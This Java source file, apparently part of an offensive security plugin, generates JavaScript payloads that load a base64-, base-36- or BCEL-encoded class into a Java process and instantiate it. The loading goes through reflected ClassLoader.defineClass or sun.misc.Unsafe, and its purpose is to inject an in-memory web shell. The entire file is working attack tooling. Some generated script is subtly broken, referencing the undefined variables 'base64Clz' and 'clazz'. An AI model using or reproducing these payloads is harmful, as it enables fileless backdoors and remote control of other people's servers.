package me.gv7.woodpecker.plugin.utils;

public class MemShellJSUtils {

    public static String getMemShellPayload(byte[] memShell, int mode) throws Exception {
        try {
            switch (mode) {
                case MemShellClassFactory.BASE64:
                    MemShellClassFactory classFactory1 = new MemShellClassFactory(memShell, MemShellClassFactory.BASE64);
                    return removeDuelSpace(
                            "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                                    "try{" +
                                    "    classLoader.loadClass('" + classFactory1.getClassName() + "').newInstance();" +
                                    "}catch (e){" +
                                    "    var clsString = classLoader.loadClass('java.lang.String');" +
                                    "    var bytecodeBase64 = '" + classFactory1.getPayload() + "';" +
                                    "    var bytecode;" +
                                    "    try{" +
                                    "        var clsBase64 = classLoader.loadClass('java.util.Base64');" +
                                    "        var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');" +
                                    "        var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz);" +
                                    "        bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);" +
                                    "    } catch (ee) {" +
                                    "        try {" +
                                    "            var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');" +
                                    "            bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);" +
                                    "        } catch (eee) {" +
                                    "            var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');" +
                                    "            bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);" +
                                    "        }" +
                                    "    }" +
                                    "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
                                    "    var clsByteArray = (new java.lang.String('a').getBytes().getClass());" +
                                    "    var clsInt = java.lang.Integer.TYPE;" +
                                    "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);" +
                                    "    defineClass.setAccessible(true);" +
                                    "    var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
                                    "    clazz.newInstance();" +
                                    "}");
                case MemShellClassFactory.BIGINTEGER:
                    MemShellClassFactory classFactory2 = new MemShellClassFactory(memShell, MemShellClassFactory.BIGINTEGER);
                    return removeDuelSpace(
                            "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                                    "try{" +
                                    "    classLoader.loadClass('" + classFactory2.getClassName() + "').newInstance();" +
                                    "}catch (e){" +
                                    "    var clsString = classLoader.loadClass('java.lang.String');" +
                                    "    var bytecodeRaw = '" + classFactory2.getPayload() + "';" +
                                    "    var bytecode = new java.math.BigInteger(bytecodeRaw,36).toByteArray();" +
                                    "    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
                                    "    var clsByteArray = (new java.lang.String('a').getBytes().getClass());" +
                                    "    var clsInt = java.lang.Integer.TYPE;" +
                                    "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);" +
                                    "    defineClass.setAccessible(true);" +
                                    "    var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
                                    "    clazz.newInstance();" +
                                    "}");
                case MemShellClassFactory.BCEL:
                    MemShellClassFactory classFactory3 = new MemShellClassFactory(memShell, MemShellClassFactory.BCEL);
                    return removeDuelSpace(
                            "try {load('nashorn:mozilla_compat.js');}catch (e) {}importPackage(Packages.sun.misc); new com.sun.org.apache.bcel.internal.util.ClassLoader(new java.net.URLClassLoader(URLClassPath.pathToURLs(''),java.lang.Thread.currentThread().getContextClassLoader())).loadClass('" + classFactory3.getPayload() + "').newInstance();");
                case MemShellClassFactory.UNSAFE:
                    MemShellClassFactory classFactory4 = new MemShellClassFactory(memShell, MemShellClassFactory.BASE64);
                    return removeDuelSpace(
                            "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                                    "try{" +
                                    "    classLoader.loadClass('" + classFactory4.getClassName() + "').newInstance();" +
                                    "}catch (e){" +
                                    "    var clsString = classLoader.loadClass('java.lang.String');" +
                                    "    var bytecodeBase64 = '" + classFactory4.getPayload() + "';" +
                                    "    var bytecode;" +
                                    "    try{" +
                                    "        var clsBase64 = classLoader.loadClass('java.util.Base64');" +
                                    "        var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');" +
                                    "        var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz);" +
                                    "        bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);" +
                                    "    } catch (ee) {" +
                                    "        try {" +
                                    "            var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');" +
                                    "            bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);" +
                                    "        } catch (eee) {" +
                                    "            var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');" +
                                    "            bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);" +
                                    "        }" +
                                    "    }" +
                                    "    var m = classLoader.loadClass('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                                    "    m.setAccessible(true);" +
                                    "    m.get(null).defineClass('" + classFactory4.getClassName() + "',bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length),null,null).newInstance();" +
                                    "    clazz.newInstance();" +
                                    "}");
            }
        } catch (Exception ex) {
            return "生成发生错误:" + ex.getMessage();
        }
        return "";
    }

    private static String removeDuelSpace(String text) {
        while (text.contains("  ")) {
            text = text.replace("  ", "");
        }
        return text;
    }

}
